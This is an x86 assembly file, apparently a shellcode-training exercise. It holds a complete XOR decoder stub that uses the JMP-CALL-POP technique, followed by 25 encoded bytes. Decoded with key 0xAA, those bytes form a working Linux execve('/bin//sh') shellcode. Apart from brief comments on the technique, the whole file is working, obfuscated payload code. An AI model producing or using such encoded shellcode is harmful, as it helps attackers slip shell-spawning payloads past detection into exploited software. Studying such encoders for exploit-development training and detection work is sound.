
global _start

section .text

_start: 
	; Now here we write the decoder stub 
	
	jmp short call_decoder


decoder: 

	pop esi 
	
	; length of the shellcode is 25 now we have to go 25 time to xor this shellcode
	; we use the loop instruction which will take ecx register 

	xor ecx, ecx 
	mov cl, 25
	
decode: 	

	xor byte [esi], 0xAA
	inc esi 
	loop decode
	jmp short Shellcode 


call_decoder: 

	call decoder

	; the first thing the decoder would require is to figure out where exactly your shellcode sitting in
	; the program memory for this we will use JMP-CALL-POP technique to find this out 

	Shellcode: db 0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a
